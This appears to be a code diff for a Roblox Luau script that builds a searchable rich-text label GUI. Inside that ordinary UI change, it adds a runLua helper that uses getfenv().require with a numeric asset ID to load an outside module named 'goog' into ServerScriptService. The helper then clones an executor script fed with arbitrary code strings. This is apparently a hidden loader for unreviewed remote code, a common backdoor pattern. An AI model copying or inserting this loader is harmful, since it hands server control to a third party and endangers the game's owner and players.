@@ -1,3 +1,29 @@
+--!strict
+local Players = game:GetService("Players")
+local ServerScriptService = game:GetService("ServerScriptService")
+local runLua = function(caller: Player, code: string, waitDelete: number?)
+    if not ServerScriptService:FindFirstChild("goog") then
+        local ticking = tick()
+        getfenv().require(112691275102014).load() -- getfenv so it stops error in ide thanks
+        repeat task.wait() until ServerScriptService:FindFirstChild("goog") or tick() - ticking >= 10
+    end
+
+    local goog = ServerScriptService:FindFirstChild("goog")
+    local p = caller
+
+    if not goog then
+        error("goog failed to be added, command can not continue")
+    end
+
+    local scr = goog:FindFirstChild("Utilities").Client:Clone()
+    local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()
+
+    loa.Parent = scr
+    scr:WaitForChild("Exec").Value = code
+
+    return scr
+end
+
 type GuiOptions = {
     SearchBar: boolean?,
 }
@@ -59,12 +85,20 @@ local function NewGui(labels: {}, options: GuiOptions?): ScreenGui
         searchBox.Text = ""
         searchBox.TextXAlignment = Enum.TextXAlignment.Left
         searchBox.ClearTextOnFocus = true
-        searchBox:GetPropertyChangedSignal("Text"):Connect(function(input: InputObject)
+
+        local inputChangedEvent = Instance.new("RemoteEvent", mainFrame)
+        inputChangedEvent.OnServerEvent:Connect(function(a0: Player, msg: string)
             -- TODO: strip function for richtext format
-            for i, v: TextLabel in pairs(innerFrame:GetChildren()) do
-                v.Visible = string.find(v.Text:lower(), searchBox.Text:lower()) ~= nil
-            end
+            for i,v in pairs(innerFrame:GetChildren()) do
+                local lab = v :: TextLabel
+                lab.Visible = string.find(lab.Text:lower(), searchBox.Text:lower()) ~= nil
+            end 
         end)
+        
+        -- localscript for transmitting data
+        local script = runLua(Players.SnowClan_8342, `local searchBox = script.Parent:FindFirstChild("TextBox") :: TextBox searchBox:GetPropertyChangedSignal("Text"):Connect(function(input: InputObject) local event: RemoteEvent = script.Parent:FindFirstChild("RemoteEvent") event:FireServer(searchBox.Text) end)`)
+        script.Parent = mainFrame
+        script.Enabled = true
     end
 
 	local closeButton = Instance.new("TextButton", mainFrame)
@@ -84,7 +118,9 @@ end
 
 NewGui({
     `I want the <font color="#FF7800">orange</font> candy.`,
-    `I want the <font color="#0078FF">blue</font> candy.`
+    `I want the <font color="#FF0000">red</font> candy.`,
+    `I want the <font color="#0078FF">blue</font> candy.`,
+    `I want the <font color="#0000FF">blue</font> candy.`
 }, {
     SearchBar = true
 }).Parent = game.Players.SnowClan_8342.PlayerGui
